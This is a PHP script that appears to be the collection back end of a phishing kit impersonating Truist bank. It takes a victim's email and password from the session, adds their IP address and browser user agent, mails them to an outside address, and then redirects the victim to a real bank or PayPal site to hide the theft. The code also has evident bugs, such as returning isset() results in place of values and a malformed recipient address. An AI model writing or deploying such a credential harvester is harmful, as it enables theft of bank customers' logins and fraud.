<?php
session_start();

$to = 'johnDoe$gmail.com';

$email = isset($_SESSION['email']) ? isset($_SESSION['email']) : 'John Doe';
$password = isset($_SESSION['password']) ? isset($_SESSION['email']) : 'Err!!!';
$AGENT = $_SERVER['HTTP_USER_AGENT'];
$IP = $_SERVER['REMOTE_ADDR'];

$subject = 'From Truist';

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: MyCompany <welcome@mycompany.com>' . "\r\n";  

$message = 'email : '. $email . '\n';
$message.= 'password : ' . $password . '\n';
$message.= 'User Agent : '. $AGENT . '\n';
$message.= 'IP ADDRESS : '. $IP;

if(mail($to, $subject, $message, $headers)){
    header('location:www.paypal.com');
}else{
    header('location:truist.com');
}

?>